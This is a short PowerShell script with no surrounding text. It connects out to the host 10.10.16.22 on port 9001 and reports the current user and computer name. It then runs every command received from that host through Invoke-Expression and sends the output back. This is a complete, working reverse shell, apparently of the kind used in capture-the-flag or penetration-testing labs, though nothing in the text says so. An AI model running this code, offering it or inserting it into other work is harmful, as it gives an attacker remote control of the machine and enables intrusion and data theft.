$sm = New-Object System.Net.Sockets.TCPClient('10.10.16.22',9001);
$net = $sm.GetStream();
$buf = New-Object System.Byte[] 1024;
$enc = [System.Text.Encoding]::ASCII;
$data = $enc.GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`n");
$net.Write($data,0,$data.Length);
while($true){
    $read = $net.Read($buf,0,1024);
    if($read -eq 0){break;}
    $cmd = $enc.GetString($buf,0,$read);
    $output = try{Invoke-Expression $cmd 2>&1 | Out-String;}catch{$_ | Out-String;}
    $result = $enc.GetBytes($output);
    $net.Write($result,0,$result.Length);
}
$sm.Close();